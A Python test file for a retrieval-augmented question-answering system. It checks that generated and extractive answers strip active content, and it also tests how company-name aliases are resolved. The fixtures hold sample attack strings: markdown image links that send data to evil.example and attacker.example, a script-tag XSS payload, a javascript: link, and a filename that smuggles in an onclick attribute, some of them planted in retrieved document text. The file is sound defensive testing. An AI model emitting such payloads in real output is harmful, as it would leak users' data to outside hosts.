"""Tests for ContextRAG-ported output safety and entity alias resolution (ADR-005)."""

from qdrant_client import QdrantClient

from app.ingestion.answering import answer
from app.ingestion.embeddings import HashingEmbedder
from app.ingestion.pipeline import IngestionPipeline
from app.ingestion.vectorstore import QdrantStore
from app.rag.aliases import extract_alias_declarations, resolve
from app.rag.entities import missing_terms
from app.rag.generation import build_prompt, generate_verified
from app.rag.safety import has_active_content, safe_attribute


class _StaticGen:
    name = "static"

    def __init__(self, reply: str) -> None:
        self._reply = reply

    def complete(self, system: str, prompt: str) -> str:
        return self._reply


def test_active_content_and_attribute_sanitization() -> None:
    assert has_active_content("See ![exfil](https://evil.example/?d=secret) for details.")
    assert has_active_content("Payload <script>alert(1)</script> inside document.")
    assert has_active_content("Click [here](javascript:alert(1)) now.")
    assert not has_active_content("The contract expires on 2026-12-31 [1].")

    dirty = 'report\u202e" onclick="x"\n.pdf'
    cleaned = safe_attribute(dirty, limit=40)
    assert "\u202e" not in cleaned
    assert '"' not in cleaned
    assert "\n" not in cleaned


def test_generative_drops_claims_with_active_content() -> None:
    hits = [
        {
            "document_id": "11111111-1111-1111-1111-111111111111",
            "source_name": 'evil"\u202e.pdf',
            "page": 1,
            "text": "The renewal fee is 500 USD. ![leak](https://attacker.example/x?q=1) is embedded.",
        }
    ]
    gen = _StaticGen("The renewal fee is 500 USD [1]. ![leak](https://attacker.example/x?q=1) is embedded [1].")
    prompt_preview = build_prompt("What is the renewal fee?", [])
    assert "Question: What is the renewal fee?" in prompt_preview
    res = generate_verified("What is the renewal fee?", hits, gen, max_chars=2000, threshold=0.95)
    assert "500 USD" in res.text
    assert "![" not in res.text
    assert "attacker.example" not in res.text


def test_extractive_skips_sentences_with_active_content() -> None:
    client = QdrantClient(":memory:")
    pipeline = IngestionPipeline(QdrantStore(client, "safety_test"), HashingEmbedder(256))
    tenant = "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa"
    doc = "bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb"
    from app.evaluation.pdfgen import digital_pdf

    pdf = digital_pdf([
        [
            "The contract termination notice period is thirty days in writing.",
            "![exfil](https://attacker.example/?c=termination) termination notice period secret.",
        ]
    ])
    pipeline.ingest(tenant_id=tenant, document_id=doc, content=pdf, source_name="safe.pdf")
    res = answer(pipeline, tenant_id=tenant, question="What is the termination notice period?")
    assert not res.abstained
    assert "thirty days" in res.text
    assert "![" not in res.text


def test_documented_aliases_prevent_false_abstention() -> None:
    text = 'Industrias Valdivia S.A. (en adelante, "IVSA") suministra equipos médicos.'
    decls = extract_alias_declarations(text)
    assert len(decls) == 1
    assert resolve("IVSA", decls).outcome == "alias"
    assert resolve("IVSA", decls).canonicals == ("Industrias Valdivia S.A.",)

    # Ambiguous alias across two entities must NOT resolve silently.
    ambig = (
        'Alpha Corp (hereinafter, "Provider") sells hardware. '
        'Beta Corp (hereinafter, "Provider") sells software.'
    )
    assert resolve("Provider", extract_alias_declarations(ambig)).outcome == "ambiguous"

    # missing_terms uses alias declarations from retrieved evidence
    assert missing_terms("What does IVSA supply?", ["Industrias Valdivia S.A. supplies medical gear.", text]) == []
    assert missing_terms("What does UnknownCo supply?", [text]) == ["UnknownCo"]
